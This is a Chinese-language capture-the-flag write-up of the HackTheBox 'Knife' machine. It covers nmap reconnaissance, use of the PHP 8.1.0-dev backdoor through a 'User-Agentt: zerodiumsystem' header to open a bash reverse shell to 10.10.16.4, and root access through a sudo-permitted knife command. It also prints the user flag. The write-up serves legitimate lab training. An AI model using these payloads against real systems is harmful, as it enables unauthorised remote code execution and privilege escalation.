# HackTheBox-Knife

  
  
&lt;!--more--&gt;  
使用`nmap`进行扫描  
```bash  
sudo nmap --min-rate 10000 -sS -Pn -sV 10.129.211.145  
  
Nmap scan report for 10.129.211.145  
Host is up (0.15s latency).  
Not shown: 997 closed tcp ports (reset)  
PORT   STATE    SERVICE VERSION  
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)  
53/tcp filtered domain  
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 9.76 seconds  
```  
开启了`22`端口和`80`端口，访问`80`端口  
在其返回包看到`PHP`版本信息  
```http  
HTTP/1.1 200 OK  
Date: Sat, 13 Apr 2024 10:07:00 GMT  
Server: Apache/2.4.41 (Ubuntu)  
X-Powered-By: PHP/8.1.0-dev  
Vary: Accept-Encoding  
Content-Length: 5815  
Connection: close  
Content-Type: text/html; charset=UTF-8  
```  
此版本是存在后门，可以直接进行`RCE`  
直接反弹一个`shell`到本地  
`User-Agentt:zerodiumsystem(&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.4/8888 0&gt;&amp;1&#39;&#34;);`  
获得`user.txt`的`flag`  
```bash  
james@knife:~$ cat user.txt  
cat user.txt  
8f76f62dae4f23ad7c61094fff67a86d  
```  
继续进行提权  
`sudo -l`进行查看`james`用户的权限  
```bash  
Matching Defaults entries for james on knife:  
    env_reset, mail_badpass,  
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User james may run the following commands on knife:  
    (root) NOPASSWD: /usr/bin/knife  
```  
可以无需密码以`root`权限执行`/usr/bin/knife`命令  
利用`python`获取一个交互式`shell`  
`python3 -c &#34;__import__(&#39;pty&#39;).spawn(&#39;/bin/bash&#39;)&#34;`  
利用`knife`进行提权  
`sudo /usr/bin/knife exec -E &#39;exec &#34;/bin/sh&#34;&#39;`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404131823505.png)

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/hackthebox-knife/  

